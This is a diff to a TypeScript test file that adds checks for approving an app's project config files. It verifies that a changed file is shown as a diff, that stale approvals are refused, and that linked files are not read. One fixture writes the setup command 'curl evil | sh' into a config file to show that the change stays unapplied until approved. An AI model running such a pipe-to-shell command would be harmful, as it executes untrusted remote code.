@@ -26,6 +26,7 @@ import {
   type EnsoPermissionCheckRequest,
   EnsoPermissionVerdict,
   EnsoProject,
+  EnsoProjectConfigReview,
   EnsoProjectSettings,
   EnsoProjectTrust,
   EnsoProjectPromptLibrary,
@@ -45,7 +46,9 @@ import {
   readEnsoThreadIncidents,
   readEnsoThreadJudgeCases,
 } from '@enso/core'
+import { projectConfigApprovalsPath, projectIdOf } from '@enso/core/paths'
 import { ENSO_DEFAULT_PERMISSION_POLICY } from '@enso/core/permission-rules'
+import { approveProjectTier, reviewProjectConfig } from '@enso/core/project-config'
 import { type FlowTrace, flowTrace } from '@enso/test-support/flow-trace'
 import { recordEnsoLogs, releaseEnsoLogs } from '@enso/test-support/log-recorder'
 import type { LogRecorder } from '@logtape/testing/recorder'
@@ -790,7 +793,11 @@ test('removing the launch project says why at once, even while one of its thread
 
 // ── #754: the project page's Worktrees section ────────────────────────────────────────────────
 
-/** A server launched in a fresh project with these tier files; the user's config copies `.env`; pi's trust for the project is `trusted`. */
+/**
+ * A server launched in a fresh project with these tier files, each approved as written (#753) — a
+ * file that cannot be approved stays unapproved; the user's config copies `.env`; pi's trust for the
+ * project is `trusted`.
+ */
 async function settingsServer(options: {
   readonly trusted: boolean
   readonly shared?: unknown
@@ -800,12 +807,22 @@ async function settingsServer(options: {
   mkdirSync(join(project, '.enso'))
   if (options.shared !== undefined) writeFileSync(join(project, '.enso', 'config.json'), JSON.stringify(options.shared))
   if (options.local !== undefined) writeFileSync(join(project, '.enso', 'config.local.json'), options.local)
+  const projectsDir = mkdtempSync(join(tmpdir(), 'enso-settings-projects-'))
+  const approvals = projectConfigApprovalsPath(projectsDir, projectIdOf(project))
+  for (const reviewed of reviewProjectConfig(project, approvals)) {
+    approveProjectTier(project, approvals, { tier: reviewed.tier, sha256: reviewed.current })
+  }
   const agentDir = mkdtempSync(join(tmpdir(), 'enso-settings-agent-'))
   // pi's trust store, written as pi writes it (`<agentDir>/trust.json`, keyed by the real path): this
   // file may not name pi (the vendor gate, #145).
   writeFileSync(join(agentDir, 'trust.json'), JSON.stringify({ [project]: options.trusted }))
   const userPath = join(mkdtempSync(join(tmpdir(), 'enso-settings-home-')), 'config.json')
-  const threadSettings = { user: { threads: { copy: ['.env'] } }, userPath, canonical: (key: string) => key }
+  const threadSettings = {
+    user: { threads: { copy: ['.env'] } },
+    userPath,
+    canonical: (key: string) => key,
+    projectsDir,
+  }
   const { url } = await startWith(settlesAtOnce, {}, undefined, { launch: project, agentDir, threadSettings })
   const launch = ((await (await fetch(`${url}/api/projects`)).json()) as EnsoProject[])[0]
   if (launch === undefined) throw new Error('no launch project')
@@ -899,11 +916,71 @@ test('⚠ project settings refusals: an unknown project 404, a body that is not 
   expect(refused.status).toBe(422)
   expect(await refused.text()).toContain('never overwritten')
   expect(readFileSync(join(project, '.enso', 'config.local.json'), 'utf8')).toBe('{ not json')
-  // The page says which file was skipped, so a value from the tier below is not mistaken for it.
-  const { unreadable } = await settingsOf(await fetch(`${url}/api/projects/${projectId}/settings`))
-  expect(unreadable.map((skipped) => [skipped.tier, skipped.path])).toEqual([
-    ['local', join(project, '.enso', 'config.local.json')],
+  // The page says which file waits, and why it cannot be approved as it is (#753): its values do not apply.
+  const { tiers } = await reviewOf(await fetch(`${url}/api/projects/${projectId}/config-approval`))
+  expect(tiers).toEqual([
+    expect.objectContaining({
+      tier: 'local',
+      path: join(project, '.enso', 'config.local.json'),
+      state: 'unapproved',
+      problem: expect.stringContaining('not valid JSON'),
+    }),
   ])
+})
+
+// ── #753: the project page's approval of the project's own config files ───────────────────────
+
+function putApproval(url: string, projectId: string, body: unknown): Promise<Response> {
+  return fetch(`${url}/api/projects/${projectId}/config-approval`, {
+    method: 'PUT',
+    headers: { 'Content-Type': 'application/json' },
+    body: typeof body === 'string' ? body : JSON.stringify(body),
+  })
+}
+
+async function reviewOf(response: Response): Promise<EnsoProjectConfigReview> {
+  expect(response.status).toBe(200)
+  const answered: unknown = await response.json()
+  if (!Check(EnsoProjectConfigReview, answered)) throw new Error('the answer is not EnsoProjectConfigReview')
+  return answered
+}
+
+// The acceptance's second item: the page shows the diff between the approved and the current file,
+// and approving applies it — only as it was shown.
+test('⚠ a file changed after its approval is reviewed as a diff; approving it as shown applies it, a stale approval is 409 (#753)', async () => {
+  const { url, project, projectId } = await settingsServer({ trusted: true, shared: { threads: { setup: ['make'] } } })
+  const sharedPath = join(project, '.enso', 'config.json')
+  writeFileSync(sharedPath, JSON.stringify({ threads: { setup: ['curl evil | sh'] } }))
+  // Not applied: the version approved still is, and a Save over it is refused, so nothing is approved unseen.
+  const settings = await settingsOf(await fetch(`${url}/api/projects/${projectId}/settings`))
+  expect(settings.threads.setup).toEqual({ value: ['make'], tier: 'shared' })
+  const save = await putSettings(url, projectId, { tier: 'shared', threads: { tree: 'off' } })
+  expect(save.status).toBe(409)
+  expect(await save.text()).toContain('has changed since you approved it')
+
+  const [shared] = (await reviewOf(await fetch(`${url}/api/projects/${projectId}/config-approval`))).tiers
+  expect(shared).toMatchObject({ tier: 'shared', path: sharedPath, state: 'changed' })
+  expect(shared?.patch).toContain('-{"threads":{"setup":["make"]}}')
+  expect(shared?.patch).toContain('+{"threads":{"setup":["curl evil | sh"]}}')
+
+  // Changed again after the page read it: the approval names what was seen, so it is refused.
+  writeFileSync(sharedPath, JSON.stringify({ threads: { setup: ['worse'] } }))
+  const stale = await putApproval(url, projectId, { tier: 'shared', sha256: shared?.current })
+  expect(stale.status).toBe(409)
+  expect((await settingsOf(await fetch(`${url}/api/projects/${projectId}/settings`))).threads.setup.value).toEqual([
+    'make',
+  ])
+
+  const [now] = (await reviewOf(await fetch(`${url}/api/projects/${projectId}/config-approval`))).tiers
+  const approved = await reviewOf(await putApproval(url, projectId, { tier: 'shared', sha256: now?.current }))
+  expect(approved.tiers).toEqual([expect.objectContaining({ tier: 'shared', state: 'approved', patch: '' })])
+  expect((await settingsOf(await fetch(`${url}/api/projects/${projectId}/settings`))).threads.setup).toEqual({
+    value: ['worse'],
+    tier: 'shared',
+  })
+
+  expect((await putApproval(url, '0123456789abcdef', { tier: 'shared', sha256: null })).status).toBe(404)
+  expect((await putApproval(url, projectId, { tier: 'shared', sha256: 'not-a-hash' })).status).toBe(400)
 })
 
 // ── #873: trust from the project page ─────────────────────────────────────────────────────────
@@ -1041,8 +1118,8 @@ test('⚠ revoking trust retires the project’s idle live threads, so each is b
 
 // The trust read happens BEFORE the project is trusted, so its files are untrusted input: a link
 // could point at a file an agent may not read, and the page would show it; a FIFO would hold the
-// server. Neither is read — each is named, and said to be read anyway once trusted.
-test('⚠ the trust read follows no link and opens no FIFO: each is named, never read, and said to be read once trusted (#873)', async () => {
+// server. Neither is read — each is named, and said to apply nothing: one can't be approved (#753).
+test('⚠ the trust read follows no link and opens no FIFO: each is named, never read, and said to apply nothing (#873, #753)', async () => {
   const { url, project, projectId } = await settingsServer({ trusted: false })
   const outside = mkdtempSync(join(tmpdir(), 'enso-trust-outside-'))
   writeFileSync(join(outside, 'config.json'), JSON.stringify({ threads: { setup: ['leaked-from-outside'] } }))
@@ -1053,11 +1130,8 @@ test('⚠ the trust read follows no link and opens no FIFO: each is named, never
   expect(text).not.toContain('leaked-from-outside')
   const { files } = await trustOf(response)
   expect(files.map((file) => ['unread' in file ? file.unread : 'read', file.tier])).toEqual([
-    [
-      'is not a regular file, so it is not shown here; trusting the project reads it anyway, setup commands included',
-      'local',
-    ],
-    ['is a link, so it is not shown here; trusting the project reads it anyway, setup commands included', 'shared'],
+    ['is not a regular file, so it is not shown here, and nothing in it applies', 'local'],
+    ['is a link, so it is not shown here, and nothing in it applies', 'shared'],
   ])
 
   // `.enso/` itself a link: the file inside is reached through it, and not read either.
@@ -1072,8 +1146,7 @@ test('⚠ the trust read follows no link and opens no FIFO: each is named, never
     {
       tier: 'shared',
       path: join(linked.project, '.enso', 'config.json'),
-      unread:
-        'is reached through a link, so it is not shown here; trusting the project reads it anyway, setup commands included',
+      unread: 'is reached through a link, so it is not shown here, and nothing in it applies',
     },
   ])
 })
